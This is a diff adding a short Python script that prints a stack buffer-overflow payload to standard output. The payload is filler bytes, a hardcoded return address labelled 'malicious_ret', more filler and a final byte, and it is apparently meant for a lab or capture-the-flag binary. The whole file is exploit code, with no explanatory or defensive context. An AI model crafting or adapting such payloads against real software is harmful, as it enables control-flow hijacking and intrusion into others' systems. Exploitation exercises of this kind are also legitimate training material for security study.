@@ -1,0 +1,9 @@
+#!/usr/bin/env python3
+import codecs
+import sys
+
+sys.stdout = codecs.getwriter("latin1")(sys.stdout.buffer) 
+
+malicious_ret = "\x4b\xdf\xdf\x9f"
+
+print("b"*28 + "a"*4 + malicious_ret + "C"*28 + "\x9c")
